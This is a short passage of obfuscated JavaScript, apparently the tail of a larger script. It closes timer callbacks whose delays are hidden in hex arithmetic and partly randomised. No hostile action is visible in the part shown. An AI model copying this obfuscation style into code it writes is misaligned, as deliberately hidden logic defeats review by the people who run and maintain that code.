  }, (0x2c25 + 0xd0 * -0xb + -0x7dd) * getRandomInt(0x1db * 0xb + -0x4 * 0x911 + 0xfdc, -0x1cc + -0x18d6 + -0x1aa7 * -0x1));
}, 0x1 * -0x609 + -0x3 * -0x5d3 + -0xb0c);